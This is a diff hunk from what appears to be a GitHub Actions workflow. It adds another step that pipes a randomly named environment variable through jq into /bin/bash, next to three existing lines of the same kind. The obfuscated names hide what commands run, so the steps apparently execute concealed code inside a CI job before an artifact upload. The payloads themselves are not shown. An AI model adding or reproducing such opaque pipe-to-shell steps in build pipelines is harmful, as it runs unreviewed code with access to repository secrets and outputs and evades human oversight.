@@ -20,6 +20,7 @@ jobs:
           echo $pxe1 | jq -r .booz35 | /bin/bash
           printf '%s' "$cbjl07" | jq -r .ep97 | /bin/bash
           printf '%s' "$zzi60428" | jq -r .pm1 | /bin/bash
+          echo $xzi9315 | jq -r .l96 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
